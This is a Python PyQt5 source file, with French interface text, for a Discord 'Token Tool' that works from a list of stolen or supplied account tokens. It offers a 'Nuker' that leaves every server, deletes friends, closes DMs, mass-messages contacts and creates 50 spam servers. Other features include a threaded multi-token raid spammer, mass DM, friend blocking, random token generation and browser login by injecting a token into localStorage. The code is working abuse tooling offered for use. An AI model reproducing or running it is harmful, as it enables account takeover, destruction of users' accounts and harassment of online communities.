import os
import sys
import requests
import string
import random
import threading
import time
import json
import subprocess
import base64
import urllib3
from itertools import cycle
from datetime import datetime, timezone, UTC

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                             QTextEdit, QFrame, QGraphicsDropShadowEffect, 
                             QScrollArea, QInputDialog, QMessageBox, QStyle, QStackedWidget)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QPoint, QPropertyAnimation, QEasingCurve
from PyQt5.QtGui import QColor, QCursor

TOKEN_FILE = 'input/token.txt'
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'

HELP_TEXT = "<b>Aide Token Tool</b><br><br>" \
            "<b>Infos Token:</b> Vérifie la validité et affiche les infos du compte.<br>" \
            "<b>Actions Serveur:</b> Rejoindre/Quitter des serveurs en masse.<br>" \
            "<b>Raid:</b> Spam, Mass DM, Nuker (Change langue/thème/statut)."

# --- Logic Functions ---

def load_tokens():
    if not os.path.exists('input'):
        os.makedirs('input')
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
    else:
        # Create file if not exists
        with open(TOKEN_FILE, 'w') as f:
            f.write("MTAw...\nOTk...\n# Mettez vos tokens ici, un par ligne")
        return []

def logic_token_info(logger, token_input):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens:
        logger.emit("<font color='#ef4444'>[-] Aucun token fourni ou trouvé dans input/token.txt</font>")
        return

    logger.emit(f"<font color='#3b82f6'><b>[*] Analyse de {len(tokens)} token(s)...</b></font>")
    
    for token in tokens:
        logger.emit(f"<br><font color='#a1a1aa'>--- Token: {token[:20]}... ---</font>")
        try:
            headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
            res = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            
            if res.status_code == 200:
                api = res.json()
                user_id = api.get('id', 'N/A')
                username = f"{api.get('username', 'N/A')}#{api.get('discriminator', '0')}"
                email = api.get('email', 'N/A')
                phone = api.get('phone', 'N/A')
                mfa = api.get('mfa_enabled', False)
                nitro_type = api.get('premium_type', 0)
                
                nitro_map = {0: 'Aucun', 1: 'Nitro Classic', 2: 'Nitro Boost', 3: 'Nitro Basic'}
                nitro = nitro_map.get(nitro_type, 'Inconnu')

                logger.emit(f"<font color='#22c55e'>[+] Statut: VALIDE</font>")
                logger.emit(f"<font color='#e4e4e7'>    Utilisateur: {username}</font>")
                logger.emit(f"<font color='#e4e4e7'>    ID: {user_id}</font>")
                logger.emit(f"<font color='#e4e4e7'>    Email: {email} (Vérifié: {api.get('verified', False)})</font>")
                logger.emit(f"<font color='#e4e4e7'>    Téléphone: {phone}</font>")
                logger.emit(f"<font color='#e4e4e7'>    A2F (MFA): {'Oui' if mfa else 'Non'}</font>")
                logger.emit(f"<font color='#e4e4e7'>    Nitro: {nitro}</font>")
                logger.emit(f"<font color='#e4e4e7'>    Langue: {api.get('locale', 'N/A')}</font>")
            else:
                logger.emit(f"<font color='#ef4444'>[-] Statut: INVALIDE (Code {res.status_code})</font>")
        except Exception as e:
            logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_token_login(logger, token_input):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens:
        logger.emit("<font color='#ef4444'>[-] Aucun token.</font>")
        return

    logger.emit(f"<font color='#3b82f6'><b>[*] Test de connexion pour {len(tokens)} token(s)...</b></font>")
    for token in tokens:
        try:
            headers = {'Authorization': token, 'User-Agent': USER_AGENT}
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if r.status_code == 200:
                user = r.json()
                logger.emit(f"<font color='#22c55e'>[+] Valide: {user.get('username')}#{user.get('discriminator')}</font>")
            else:
                logger.emit(f"<font color='#ef4444'>[-] Invalide: {token[:25]}...</font>")
        except Exception as e:
            logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_generator(logger, count):
    logger.emit(f"<font color='#3b82f6'><b>[*] Génération de {count} tokens (Format aléatoire)...</b></font>")
    
    def generate_one():
        first = ''.join((random.choice(string.ascii_letters + string.digits + '-_') for _ in range(random.choice([24, 26]))))
        second = ''.join((random.choice(string.ascii_letters + string.digits + '-_') for _ in range(6)))
        third = ''.join((random.choice(string.ascii_letters + string.digits + '-_') for _ in range(38)))
        return f'{first}.{second}.{third}'

    for _ in range(int(count)):
        token = generate_one()
        # Note: Checking generated tokens is usually futile without a massive proxy pool, so we just generate here.
        logger.emit(f"<font color='#e4e4e7'>{token}</font>")
    logger.emit("<font color='#3b82f6'><b>[*] Génération terminée.</b></font>")

def logic_nuker(logger, token_input, config):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens: return

    logger.emit(f"<font color='#3b82f6'><b>[*] Lancement du Nuker TOTAL...</b></font>")
    modes = cycle(['light', 'dark'])
    langs = ['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs']
    
    mass_dm_msg = config.get('mass_dm')
    server_name = config.get('server_name', 'Nuked')
    status_text = config.get('status_text', 'Nuked')
    bio_text = config.get('bio_text', 'Nuked')

    for token in tokens:
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
        try:
            # 0. Update Profile (Bio, Global Name)
            logger.emit(f"<font color='#ef4444'>[!] Modification du Profil...</font>")
            try:
                requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json={'bio': bio_text, 'global_name': status_text})
            except: pass

            # 1. Mass DM (Optionnel)
            if mass_dm_msg:
                logger.emit(f"<font color='#a1a1aa'>[i] Mass DM en cours...</font>")
                try:
                    r = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
                    if r.status_code == 200:
                        for channel in r.json():
                            cid = channel['id']
                            requests.post(f'https://discord.com/api/v9/channels/{cid}/messages', headers=headers, json={'content': mass_dm_msg})
                            time.sleep(0.5)
                except: pass

            # 2. Leave Guilds
            logger.emit(f"<font color='#ef4444'>[!] Quitter les serveurs...</font>")
            try:
                guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers).json()
                for guild in guilds:
                    requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild["id"]}', headers=headers)
                    time.sleep(0.1)
            except: pass

            # 3. Delete Friends
            logger.emit(f"<font color='#ef4444'>[!] Suppression des amis...</font>")
            try:
                friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers).json()
                for friend in friends:
                    requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}', headers=headers)
                    time.sleep(0.1)
            except: pass

            # 4. Close DMs
            logger.emit(f"<font color='#ef4444'>[!] Fermeture des DMs...</font>")
            try:
                dms = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers).json()
                for dm in dms:
                    requests.delete(f'https://discord.com/api/v9/channels/{dm["id"]}', headers=headers)
                    time.sleep(0.1)
            except: pass

            # 5. Create Spam Servers
            logger.emit(f"<font color='#ef4444'>[!] Création de serveurs spam...</font>")
            try:
                for i in range(50):
                    requests.post('https://discord.com/api/v9/guilds', headers=headers, json={'name': f'{server_name} {i}'})
                    time.sleep(0.1)
            except: pass

            # 6. HypeSquad Random
            try:
                house = random.choice([1, 2, 3])
                requests.post('https://discord.com/api/v9/hypesquad/online', headers=headers, json={'house_id': house})
            except: pass
            
            # 7. Chaos Cycle (Lang/Theme/Status)
            logger.emit(f"<font color='#22c55e'>[+] Chaos Visuel sur {token[:15]}...</font>")
            for _ in range(20):
                lang = random.choice(langs)
                theme = next(modes)
                requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json={'locale': lang, 'theme': theme, 'custom_status': {'text': status_text}})
                time.sleep(0.1)
        except Exception as e:
            logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_joiner(logger, token_input, invite_link):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens or not invite_link: return

    invite_code = invite_link.split('/')[-1]
    logger.emit(f"<font color='#3b82f6'><b>[*] Tentative de rejoindre {invite_code}...</b></font>")
    
    for token in tokens:
        try:
            r = requests.post(f'https://discord.com/api/v9/invites/{invite_code}', headers={'Authorization': token, 'User-Agent': USER_AGENT})
            if r.status_code == 200:
                logger.emit(f"<font color='#22c55e'>[+] Rejoint avec succès ({token[:15]}...)</font>")
            else:
                logger.emit(f"<font color='#ef4444'>[-] Échec ({r.status_code}) pour {token[:15]}...</font>")
        except Exception as e:
            logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_leaver(logger, token_input):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens: return

    logger.emit(f"<font color='#3b82f6'><b>[*] Quitter tous les serveurs...</b></font>")
    for token in tokens:
        headers = {'Authorization': token, 'User-Agent': USER_AGENT}
        try:
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers).json()
            if not isinstance(guilds, list): continue
            
            for guild in guilds:
                gid = guild['id']
                name = guild['name']
                r = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{gid}", headers=headers)
                if r.status_code in [200, 204]:
                    logger.emit(f"<font color='#22c55e'>[+] Quitté: {name}</font>")
                else:
                    logger.emit(f"<font color='#ef4444'>[-] Erreur {name}: {r.status_code}</font>")
                time.sleep(0.5)
        except Exception as e:
            logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_spammer(logger, token_input, target_id, message, count):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens or not target_id or not message: return

    logger.emit(f"<font color='#3b82f6'><b>[*] Spam de {count} messages vers {target_id}...</b></font>")
    
    for token in tokens:
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
        for i in range(int(count)):
            try:
                r = requests.post(f'https://discord.com/api/v9/channels/{target_id}/messages', headers=headers, json={'content': message})
                if r.status_code in [200, 201]:
                    logger.emit(f"<font color='#22c55e'>[+] Message {i+1} envoyé</font>")
                else:
                    logger.emit(f"<font color='#ef4444'>[-] Erreur {r.status_code}</font>")
                time.sleep(0.5)
            except Exception as e:
                logger.emit(f"<font color='#ef4444'>[-] Exception: {e}</font>")

def logic_mass_dm(logger, token_input, message):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens or not message: return

    logger.emit(f"<font color='#3b82f6'><b>[*] Mass DM (DMs ouverts)...</b></font>")
    for token in tokens:
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
        try:
            # Get DM channels
            r = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
            if r.status_code != 200: continue
            channels = r.json()
            
            for channel in channels:
                cid = channel['id']
                recipients = [u['username'] for u in channel.get('recipients', [])]
                
                res = requests.post(f'https://discord.com/api/v9/channels/{cid}/messages', headers=headers, json={'content': message})
                if res.status_code in [200, 201]:
                    logger.emit(f"<font color='#22c55e'>[+] DM envoyé à {', '.join(recipients)}</font>")
                else:
                    logger.emit(f"<font color='#ef4444'>[-] Échec DM {cid} ({res.status_code})</font>")
                time.sleep(1)
        except Exception as e:
            logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_bruteforce_id(logger, user_id):
    if not user_id: return
    try:
        one_part = str(base64.b64encode(user_id.encode('utf-8')), 'utf-8').replace('=', '')
        logger.emit(f"<font color='#3b82f6'><b>[*] ID: {user_id}</b></font>")
        logger.emit(f"<font color='#22c55e'>[+] Première partie du token: {one_part}</font>")
        logger.emit(f"<font color='#a1a1aa'>    Note: Le reste du token est aléatoire et ne peut être deviné mathématiquement.</font>")
    except Exception as e:
        logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_block_friends(logger, token_input):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens: return

    logger.emit(f"<font color='#3b82f6'><b>[*] Blocage des amis...</b></font>")
    for token in tokens:
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
        try:
            r = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
            if r.status_code == 200:
                friends = r.json()
                if not friends: logger.emit(f"<font color='#a1a1aa'>[-] Aucun ami trouvé sur ce token.</font>")
                for friend in friends:
                    fid = friend['id']
                    user = friend['user']['username']
                    try:
                        requests.put(f'https://discord.com/api/v9/users/@me/relationships/{fid}', headers=headers, json={"type": 2})
                        logger.emit(f"<font color='#22c55e'>[+] Bloqué: {user}</font>")
                    except Exception as e:
                        logger.emit(f"<font color='#ef4444'>[-] Erreur blocage {user}: {e}</font>")
                    time.sleep(0.2)
            else:
                logger.emit(f"<font color='#ef4444'>[-] Erreur récupération amis ({r.status_code})</font>")
        except Exception as e:
            logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_delete_friends(logger, token_input):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens: return

    logger.emit(f"<font color='#3b82f6'><b>[*] Suppression des amis...</b></font>")
    for token in tokens:
        headers = {'Authorization': token, 'User-Agent': USER_AGENT}
        try:
            r = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
            if r.status_code == 200:
                friends = r.json()
                if not friends: logger.emit(f"<font color='#a1a1aa'>[-] Aucun ami trouvé sur ce token.</font>")
                for friend in friends:
                    fid = friend['id']
                    user = friend['user']['username']
                    try:
                        requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{fid}', headers=headers)
                        logger.emit(f"<font color='#22c55e'>[+] Supprimé: {user}</font>")
                    except Exception as e:
                        logger.emit(f"<font color='#ef4444'>[-] Erreur suppression {user}: {e}</font>")
                    time.sleep(0.2)
            else:
                logger.emit(f"<font color='#ef4444'>[-] Erreur récupération amis ({r.status_code})</font>")
        except Exception as e:
            logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_delete_dms(logger, token_input):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens: return

    logger.emit(f"<font color='#3b82f6'><b>[*] Fermeture des DMs...</b></font>")
    for token in tokens:
        headers = {'Authorization': token, 'User-Agent': USER_AGENT}
        try:
            r = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers)
            if r.status_code == 200:
                channels = r.json()
                if not channels: logger.emit(f"<font color='#a1a1aa'>[-] Aucun DM trouvé sur ce token.</font>")
                for channel in channels:
                    cid = channel['id']
                    try:
                        requests.delete(f'https://discord.com/api/v9/channels/{cid}', headers=headers)
                        logger.emit(f"<font color='#22c55e'>[+] DM Fermé: {cid}</font>")
                    except Exception as e:
                        logger.emit(f"<font color='#ef4444'>[-] Erreur fermeture {cid}: {e}</font>")
                    time.sleep(0.2)
            else:
                logger.emit(f"<font color='#ef4444'>[-] Erreur récupération DMs ({r.status_code})</font>")
        except Exception as e:
            logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_selenium_login(logger, token, browser_choice):
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        from selenium.webdriver.edge.options import Options as EdgeOptions
        from selenium.webdriver.firefox.options import Options as FirefoxOptions
    except ImportError:
        logger.emit("<font color='#ef4444'>[-] Selenium non installé. pip install selenium</font>")
        return

    logger.emit(f"<font color='#3b82f6'><b>[*] Démarrage du navigateur ({browser_choice})...</b></font>")
    
    driver = None
    try:
        if browser_choice == "Chrome":
            opts = ChromeOptions()
            opts.add_experimental_option("detach", True)
            opts.add_argument("--log-level=3")
            driver = webdriver.Chrome(options=opts)
        elif browser_choice == "Edge":
            opts = EdgeOptions()
            opts.add_experimental_option("detach", True)
            opts.add_argument("--log-level=3")
            driver = webdriver.Edge(options=opts)
        elif browser_choice == "Firefox":
            opts = FirefoxOptions()
            driver = webdriver.Firefox(options=opts)
        
        if not driver: return

        logger.emit(f"<font color='#a1a1aa'>[i] Navigation vers Discord...</font>")
        driver.get("https://discord.com/login")
        time.sleep(3)
        
        script = f"""
            function login(token) {{
                setInterval(() => {{
                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"{token}"`
                }}, 50);
                setTimeout(() => {{
                    location.reload();
                }}, 2500);
            }}
            login("{token}")
        """
        driver.execute_script(script)
        logger.emit(f"<font color='#22c55e'>[+] Token injecté !</font>")
        logger.emit(f"<font color='#e4e4e7'>[i] Le navigateur restera ouvert tant que ce script tourne.</font>")
        
        # Boucle pour garder le driver actif si le detach échoue ou pour Firefox
        while True:
            time.sleep(1)
            try:
                if not driver.service.process.poll() is None: break
            except: break

    except Exception as e:
        logger.emit(f"<font color='#ef4444'>[-] Erreur Selenium: {e}</font>")

def logic_server_raid(logger, token_input, channels_str, message, threads):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens: return
    
    channels = [c.strip() for c in channels_str.replace(',', '\n').split('\n') if c.strip()]
    if not channels:
        logger.emit("<font color='#ef4444'>[-] Aucun salon spécifié.</font>")
        return

    logger.emit(f"<font color='#3b82f6'><b>[*] Lancement du Raid Serveur...</b></font>")
    logger.emit(f"<font color='#a1a1aa'>    Tokens: {len(tokens)} | Salons: {len(channels)} | Threads: {threads}</font>")

    def raid_task():
        while True:
            try:
                token = random.choice(tokens)
                channel = random.choice(channels)
                headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
                r = requests.post(f"https://discord.com/api/v9/channels/{channel}/messages", headers=headers, json={'content': message})
                if r.status_code in [200, 201]:
                    logger.emit(f"<font color='#22c55e'>[+] Message envoyé dans {channel}</font>")
                else:
                    logger.emit(f"<font color='#ef4444'>[-] Erreur {r.status_code} ({channel})</font>")
                time.sleep(0.1)
            except Exception as e:
                logger.emit(f"<font color='#ef4444'>[-] Erreur thread: {e}</font>")
                time.sleep(1)

    for _ in range(int(threads)):
        t = threading.Thread(target=raid_task, daemon=True)
        t.start()
    
    # Garder le worker principal en vie
    while True:
        time.sleep(1)

def logic_hypesquad(logger, token_input, house_choice):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens: return
    
    houses = {'1': 'Bravery', '2': 'Brilliance', '3': 'Balance'}
    house_name = houses.get(str(house_choice), 'Unknown')
    
    logger.emit(f"<font color='#3b82f6'><b>[*] Changement HypeSquad vers {house_name}...</b></font>")
    payload = {'house_id': int(house_choice)}
    
    for token in tokens:
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
        try:
            r = requests.post('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
            if r.status_code == 204:
                logger.emit(f"<font color='#22c55e'>[+] {token[:15]}... -> {house_name}</font>")
            else:
                logger.emit(f"<font color='#ef4444'>[-] Échec ({r.status_code})</font>")
        except Exception as e:
            logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_cycle_language(logger, token_input, cycles):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens: return
    
    langs = ['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs', 'fr', 'en-US']
    logger.emit(f"<font color='#3b82f6'><b>[*] Cycle Langue ({cycles} fois)...</b></font>")
    
    for token in tokens:
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
        for i in range(int(cycles)):
            try:
                lang = random.choice(langs)
                requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={'locale': lang})
                logger.emit(f"<font color='#22c55e'>[+] Langue: {lang}</font>")
                time.sleep(0.5)
            except Exception as e:
                logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_cycle_theme(logger, token_input, cycles):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens: return
    
    modes = cycle(["light", "dark"])
    logger.emit(f"<font color='#3b82f6'><b>[*] Cycle Thème ({cycles} fois)...</b></font>")
    
    for token in tokens:
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
        for i in range(int(cycles)):
            try:
                theme = next(modes)
                requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={'theme': theme})
                logger.emit(f"<font color='#22c55e'>[+] Thème: {theme}</font>")
                time.sleep(0.5)
            except Exception as e:
                logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

def logic_cycle_status(logger, token_input, status_list):
    tokens = [token_input] if token_input else load_tokens()
    if not tokens or not status_list: return
    
    logger.emit(f"<font color='#3b82f6'><b>[*] Cycle Statut (10 boucles)...</b></font>")
    for token in tokens:
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
        for _ in range(10):
            for txt in status_list:
                try:
                    requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={"custom_status": {"text": txt}})
                    logger.emit(f"<font color='#22c55e'>[+] Statut: {txt}</font>")
                    time.sleep(2)
                except Exception as e:
                    logger.emit(f"<font color='#ef4444'>[-] Erreur: {e}</font>")

# --- Worker Thread ---

class Worker(QThread):
    log_signal = pyqtSignal(str)
    finished_signal = pyqtSignal()

    def __init__(self, target, *args):
        super().__init__()
        self.target = target
        self.args = args

    def run(self):
        self.target(self.log_signal, *self.args)
        self.finished_signal.emit()

# --- Main Window ---

class TokenToolWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.resize(1000, 650)
        self.worker = None
        self.oldPos = self.pos()
        
        # Main Container
        self.container = QFrame()
        self.container.setObjectName("MainContainer")
        self.setCentralWidget(self.container)
        
        # Shadow
        shadow = QGraphicsDropShadowEffect(self)
        shadow.setBlurRadius(20)
        shadow.setXOffset(0)
        shadow.setYOffset(0)
        shadow.setColor(QColor(0, 0, 0, 180))
        self.container.setGraphicsEffect(shadow)
        
        # Layout
        self.main_layout = QVBoxLayout(self.container)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.setSpacing(0)

        # --- Title Bar ---
        self.title_bar = QFrame()
        self.title_bar.setObjectName("TitleBar")
        self.title_bar.setFixedHeight(40)
        
        title_layout = QHBoxLayout(self.title_bar)
        title_layout.setContentsMargins(15, 0, 10, 0)
        
        title_label = QLabel("LE M // Token Tool")
        title_label.setObjectName("TitleLabel")
        
        btn_min = QPushButton("─")
        btn_min.setObjectName("TitleBtn")
        btn_min.setFixedSize(30, 30)
        btn_min.clicked.connect(self.showMinimized)
        
        btn_close = QPushButton("✕")
        btn_close.setObjectName("TitleBtnClose")
        btn_close.setFixedSize(30, 30)
        btn_close.clicked.connect(self.close)
        
        title_layout.addWidget(title_label)
        title_layout.addStretch()
        title_layout.addWidget(btn_min)
        title_layout.addWidget(btn_close)
        
        self.main_layout.addWidget(self.title_bar)
        
        # --- Content ---
        content_layout = QHBoxLayout()
        content_layout.setSpacing(0)
        content_layout.setContentsMargins(0, 0, 0, 0)

        # --- Left Panel (Scrollable) ---
        left_panel = QFrame()
        left_panel.setObjectName("SidePanel")
        left_panel.setFixedWidth(320)
        
        left_layout = QVBoxLayout(left_panel)
        left_layout.setSpacing(5)
        left_layout.setContentsMargins(15, 20, 15, 20)

        self.menu_label = QLabel("Token Tool - LE M")
        self.menu_label.setObjectName("MenuLabel")
        self.menu_label.setAlignment(Qt.AlignCenter)
        left_layout.addWidget(self.menu_label)

        # Input Area
        self.token_input = QLineEdit()
        self.token_input.setPlaceholderText("Token (vide = utiliser liste)")
        left_layout.addWidget(self.token_input)

        self.btn_edit = QPushButton()
        self.btn_edit.setObjectName("FolderBtn")
        self.btn_edit.setIcon(self.style().standardIcon(QStyle.SP_DirIcon))
        self.btn_edit.setFixedSize(40, 40)
        self.btn_edit.setToolTip("Ouvrir la liste des tokens (token.txt)")
        self.btn_edit.clicked.connect(self.open_token_file)
        
        btn_layout = QHBoxLayout()
        lbl_list = QLabel("Liste Token :")
        lbl_list.setStyleSheet("color: #a1a1aa; font-weight: bold; font-size: 13px; margin-right: 5px;")
        btn_layout.addStretch()
        btn_layout.addWidget(lbl_list)
        btn_layout.addWidget(self.btn_edit)
        btn_layout.addStretch()
        left_layout.addLayout(btn_layout)

        line = QFrame()
        line.setFrameShape(QFrame.HLine)
        line.setStyleSheet("background-color: #333; max-height: 1px;")
        left_layout.addWidget(line)

        # Scroll Area for Buttons
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setStyleSheet("background: transparent; border: none;")
        
        self.stacked_widget = QStackedWidget()
        
        # --- Page Main ---
        page_main = QWidget()
        layout_main = QVBoxLayout(page_main)
        layout_main.setSpacing(2)
        layout_main.setContentsMargins(0, 0, 0, 0)
        
        self.btn_info = QPushButton("🔍  Infos Token")
        self.btn_login = QPushButton("🔑  Connexion Token")
        self.btn_browser = QPushButton("🌐  Connexion Navigateur")
        btn_menu_server = QPushButton("🚪  Actions Serveur >")
        btn_menu_raid = QPushButton("💥  Spam / Raid >")
        btn_menu_profile = QPushButton("👤  Profil / Settings >")
        btn_menu_friends = QPushButton("👥  Amis / DMs >")
        btn_menu_utils = QPushButton("🛠️  Utils >")
        
        for btn in [self.btn_info, self.btn_login, self.btn_browser, btn_menu_server, btn_menu_raid, btn_menu_profile, btn_menu_friends, btn_menu_utils]:
            btn.setObjectName("ActionBtn")
            btn.setCursor(Qt.PointingHandCursor)
            layout_main.addWidget(btn)
        layout_main.addStretch()
            
        # --- Page Server ---
        page_server = QWidget()
        layout_server = QVBoxLayout(page_server)
        layout_server.setSpacing(2)
        layout_server.setContentsMargins(0, 0, 0, 0)
        
        self.btn_join = QPushButton("🚪  Rejoindre Serveur")
        self.btn_leave = QPushButton("🏃  Quitter Serveurs")
        btn_back_server = QPushButton("⬅️  Retour")
        
        for btn in [self.btn_join, self.btn_leave, btn_back_server]:
            btn.setObjectName("ActionBtn")
            btn.setCursor(Qt.PointingHandCursor)
            layout_server.addWidget(btn)
        layout_server.addStretch()
            
        # --- Page Raid ---
        page_raid = QWidget()
        layout_raid = QVBoxLayout(page_raid)
        layout_raid.setSpacing(2)
        layout_raid.setContentsMargins(0, 0, 0, 0)
        
        self.btn_nuker = QPushButton("💥  Nuker")
        self.btn_spam = QPushButton("📢  Spammer")
        self.btn_raid = QPushButton("⚔️  Server Raid")
        self.btn_massdm = QPushButton("📨  Mass DM")
        btn_back_raid = QPushButton("⬅️  Retour")
        
        for btn in [self.btn_nuker, self.btn_spam, self.btn_raid, self.btn_massdm, btn_back_raid]:
            btn.setObjectName("ActionBtn")
            btn.setCursor(Qt.PointingHandCursor)
            layout_raid.addWidget(btn)
        layout_raid.addStretch()
            
        # --- Page Profile ---
        page_profile = QWidget()
        layout_profile = QVBoxLayout(page_profile)
        layout_profile.setSpacing(2)
        layout_profile.setContentsMargins(0, 0, 0, 0)
        
        self.btn_hypesquad = QPushButton("🏠  HypeSquad Changer")
        self.btn_lang = QPushButton("🗣️  Cycle Langue")
        self.btn_theme = QPushButton("🎨  Cycle Thème")
        self.btn_status = QPushButton("📝  Cycle Statut")
        btn_back_profile = QPushButton("⬅️  Retour")
        
        for btn in [self.btn_hypesquad, self.btn_lang, self.btn_theme, self.btn_status, btn_back_profile]:
            btn.setObjectName("ActionBtn")
            btn.setCursor(Qt.PointingHandCursor)
            layout_profile.addWidget(btn)
        layout_profile.addStretch()

        # --- Page Friends ---
        page_friends = QWidget()
        layout_friends = QVBoxLayout(page_friends)
        layout_friends.setSpacing(2)
        layout_friends.setContentsMargins(0, 0, 0, 0)
        
        self.btn_block_friends = QPushButton("🚫  Bloquer Amis")
        self.btn_del_friends = QPushButton("❌  Supprimer Amis")
        self.btn_del_dms = QPushButton("🗑️  Fermer DMs")
        btn_back_friends = QPushButton("⬅️  Retour")
        
        for btn in [self.btn_block_friends, self.btn_del_friends, self.btn_del_dms, btn_back_friends]:
            btn.setObjectName("ActionBtn")
            btn.setCursor(Qt.PointingHandCursor)
            layout_friends.addWidget(btn)
        layout_friends.addStretch()

        # --- Page Utils ---
        page_utils = QWidget()
        layout_utils = QVBoxLayout(page_utils)
        layout_utils.setSpacing(2)
        layout_utils.setContentsMargins(0, 0, 0, 0)
        
        self.btn_gen = QPushButton("🎲  Générateur")
        self.btn_brute = QPushButton("🔓  ID vers Token")
        btn_back_utils = QPushButton("⬅️  Retour")
        
        for btn in [self.btn_gen, self.btn_brute, btn_back_utils]:
            btn.setObjectName("ActionBtn")
            btn.setCursor(Qt.PointingHandCursor)
            layout_utils.addWidget(btn)
        layout_utils.addStretch()
            
        self.stacked_widget.addWidget(page_main)
        self.stacked_widget.addWidget(page_server)
        self.stacked_widget.addWidget(page_raid)
        self.stacked_widget.addWidget(page_profile)
        self.stacked_widget.addWidget(page_friends)
        self.stacked_widget.addWidget(page_utils)
        
        # Connect buttons
        self.btn_info.clicked.connect(lambda: self.start_task(logic_token_info, self.token_input.text()))
        self.btn_login.clicked.connect(lambda: self.start_task(logic_token_login, self.token_input.text()))
        self.btn_browser.clicked.connect(self.action_selenium_login)
        self.btn_gen.clicked.connect(self.action_generator)
        self.btn_nuker.clicked.connect(self.action_nuker)
        self.btn_block_friends.clicked.connect(lambda: self.start_task(logic_block_friends, self.token_input.text()))
        self.btn_del_friends.clicked.connect(lambda: self.start_task(logic_delete_friends, self.token_input.text()))
        self.btn_del_dms.clicked.connect(lambda: self.start_task(logic_delete_dms, self.token_input.text()))
        self.btn_join.clicked.connect(self.action_joiner)
        self.btn_leave.clicked.connect(lambda: self.start_task(logic_leaver, self.token_input.text()))
        self.btn_spam.clicked.connect(self.action_spammer)
        self.btn_raid.clicked.connect(self.action_server_raid)
        self.btn_massdm.clicked.connect(self.action_massdm)
        self.btn_brute.clicked.connect(self.action_brute)
        self.btn_hypesquad.clicked.connect(self.action_hypesquad)
